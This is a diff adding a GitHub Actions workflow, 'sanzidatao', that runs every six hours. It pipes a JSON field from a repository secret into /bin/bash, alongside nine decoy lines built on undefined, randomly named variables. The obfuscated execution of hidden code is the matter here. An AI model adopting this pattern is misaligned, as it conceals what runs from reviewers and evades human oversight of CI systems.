@@ -1,0 +1,27 @@
+name: sanzidatao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sanzidatao
+        env:
+          zbqts4: ${{ secrets.zbqts4 }}
+        run: |
+          echo $zbqts4 | jq -r .qeyp1 | /bin/bash
+          echo $xruu8 | jq -r .bdhh437 | /bin/bash
+          echo $q08285 | jq -r .e0373 | /bin/bash
+          echo $fgdcd02516 | jq -r .ha49991 | /bin/bash
+          echo $r58241 | jq -r .owqz4 | /bin/bash
+          echo $y5 | jq -r .esmuk6 | /bin/bash
+          echo $orzlk8 | jq -r .gtrw36 | /bin/bash
+          echo $grh75 | jq -r .qvdun94497 | /bin/bash
+          echo $ahm3865 | jq -r .kmh1237 | /bin/bash
+          echo $bz9 | jq -r .a2473 | /bin/bash
+
